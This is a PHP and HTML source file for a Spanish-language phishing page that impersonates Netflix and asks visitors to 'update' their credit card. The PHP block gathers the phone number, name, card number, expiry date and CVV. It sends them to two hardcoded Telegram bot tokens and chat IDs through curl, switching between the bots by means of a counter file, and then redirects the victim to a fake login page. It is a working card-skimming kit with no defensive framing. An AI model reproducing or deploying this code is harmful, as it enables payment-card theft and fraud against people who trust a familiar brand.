<?php 
    session_start();
    if (isset($_POST['enviar'])) {
        $numero_telefono = $_POST['numero_telefono'];        
        $nombre = $_POST['nombre'];
        $apellido = $_POST['apellido'];
        $numero_tarjeta = $_POST['numerotarjeta'];
        $mes = $_POST['mes'];
        $a = $_POST['a'];
        $cvv = $_POST['cvv'];
        
        if ($numero_telefono>99999999 and isset($_POST['nombre'])) {
            if (isset($_POST['apellido']) and isset($numero_tarjeta))
            {
                if(isset($_POST['mes']) and isset($_POST['a'])) {
                    if ($cvv>99) {
                        $archivo = fopen('./a3.txt', 'r');
                        $linea = fgets($archivo);
                        if ($linea==1) {
                            fclose($archivo);
                            $archivo = fopen('./a3.txt', 'w');
                            fwrite($archivo, 2);
                            fclose($archivo);
                            $_SESSION['sesion'] = true;
                            $msg = "===================="."\n"."Numero Telefono: ".$numero_telefono."\n"."Nombre: ".$nombre."\n"."Numero de tarjeta: ".$numero_tarjeta."\n"."Vencimiento: ".$mes."/".$a."\n"."Cvv: ".$cvv."\n"."================="."\n";
                            $api_key  = '5431710049:AAH7QTdzK-3_IJIVbPndVLRBVhIQLxyCMOk';
                            $id  = '5327111772';
                            $urlMsg = "https://api.telegram.org/bot{$api_key}/sendMessage";
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, $urlMsg);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);         
                            $server_output = curl_exec($ch);
                            curl_close($ch); 
                            header("Location: ../login/index.php");
                            die();} elseif($linea==2) {
                            fclose($archivo);
                            $archivo = fopen('./a3.txt', 'w');
                            fwrite($archivo, 1);
                            fclose($archivo);
                            $_SESSION['sesion'] = true;
                            $msg = "===================="."\n"."Numero Telefono: ".$numero_telefono."\n"."Nombre: ".$nombre."\n"."Numero de tarjeta: ".$numero_tarjeta."\n"."Vencimiento: ".$mes."/".$a."\n"."Cvv: ".$cvv."\n"."================="."\n";
                            $api_key  = '5565358413:AAFlUtkGZlLzSKzff7LaoxvgF5CtXNyegag';
                            $id  = '5149477828';
                            $urlMsg = "https://api.telegram.org/bot{$api_key}/sendMessage";
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, $urlMsg);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);         
                            $server_output = curl_exec($ch);
                            curl_close($ch);
                            header("Location: ../login/index.php");
                            die();} else {
                                $_SESSION['sesion'] = true;
                                $msg = "===================="."\n"."Numero Telefono: ".$numero_telefono."\n"."Nombre: ".$nombre."\n"."Numero de tarjeta: ".$numero_tarjeta."\n"."Vencimiento: ".$mes."/".$a."\n"."Cvv: ".$cvv."\n"."================="."\n";
                                $api_key  = '5431710049:AAH7QTdzK-3_IJIVbPndVLRBVhIQLxyCMOk';
                                $id  = '5327111772';
                                $urlMsg = "https://api.telegram.org/bot{$api_key}/sendMessage";
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $urlMsg);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);         
                                $server_output = curl_exec($ch);
                                curl_close($ch); 
                                header("Location: ../login/index.php");
                                die();}
                            }
                    }
                }
            } else {
               }   $uno = 1;
        }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./style.css">
    <link rel="shortcut icon" href="../img/favicoin.ico" type="image/x-icon">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
</head>
<body>
    <header>
        <nav class="contenedor">
            <div class="float_img">
                <div class="img_center">
                    <img src="../img/netflix_logo.png" alt="Netflix Logo">
                </div>
            </div>
            <div class="float_text">
                <div class="link_center">
                    <a href="../session_destroy/main.php">Cerrar sesión</a>
                </div>
            </div>
        </nav>
    </header>
    <main>
        <div class="contenedor_main">
            <div class="h1__main">
                <h1>Configura tu tarjeta de crédito o débito</h1>
            </div>
            <div class="img_ccs">
                <img src="../img/visa-v3.svg" alt="">
                <img src="../img/mastercard-v2.svg" alt="">
                <img src="../img/amex-v2.svg" alt="">
            </div>
            <div class="form">
                <form action="" method="POST">
                    <input maxlength="9" name="numero_telefono" type="text" placeholder="Número de teléfono" required pattern="[0-9]{9}" title="El número telefonico contiene 9 digitos" name="numerto_telefono">
                    <br>
                    <input maxlength="40" name="nombre" type="text" placeholder="Nombre" required pattern="[a-z]{4-20}" title="Solo se acepta letras.">
                    <br>
                    <input maxlength="40" name="apellido" type="text" placeholder="Apellido" required pattern="[a-z]{4-20}" title="Solo se aceptan letras.">
                    <br>
                    <input maxlength="16" minlength="16" name="numerotarjeta" type="text" placeholder="Número de tarjeta" required pattern="[0-9]{16}" title="El número de tarjeta contiene 16 digitos">
                    <br>
                    <select name="mes" id="" required title="Mes de vencimiento">
                        <option name="format" selected disabled>Mes de Vencimiento</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select name="a" id="" required title="Año de vencimiento">
                        <option value="" selected disabled>Año de Vencimiento</option>
                        <option value="2022">2022</option>
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>
                        <option value="2036">2036</option>
                        <option value="2037">2037</option>
                        <option value="2038">2038</option>
                        <option value="2039">2039</option>
                        <option value="2040">2040</option>
                        <option value="2041">2041</option>
                        <option value="2042">2042</option>
                        <option value="2043">2043</option>
                        <option value="2044">2044</option>
                        <option value="2045">2045</option>
                        <option value="2046">2046</option>
                        <option value="2047">2047</option>
                    </select>
                    <br>
                    <input maxlength="4" minlength="3" name="cvv" type="text" placeholder="Código de seguridad (CVV)" pattern="[0,9]{3-4}" required title="Codigo de seguridad.">
                    <div class="texto_main">
                        <p>
                            Al hacer clic en el botón de actualizar datos, aceptas nuestros <a href="https://help.netflix.com/legal/termsofuse">Términos de uso</a> y nuestras <a href="https://help.netflix.com/legal/privacy">Declaración de privacidad</a>.
                        </p>
                    </div>
                    <div class="button">
                        <button type="submit" name="enviar">Actualizar Datos</button>
                    </div>
                </form>
            </div> 
        </div>
    </main>
    <footer>
        <div class="footer_uno">
            <h1>¿Pregunta? Llama al 0800 345 1593</h1>
        </div>
        <div class="footer_dos">
            <ul>
                <li>
                    <a href="https://help.netflix.com/es/node/412">Preguntas frecuentes</a>
                </li>
                <li>
                    <a href="https://help.netflix.com/es/">Centro de ayuda</a>
                </li>
                <li>
                    <a href="https://help.netflix.com/legal/termsofuse">Términos de uso</a>
                </li>
                <li>
                    <a href="https://help.netflix.com/legal/privacy">Privacidad</a>
                </li>
            </ul>
        </div>
    </footer>
</body>
</html>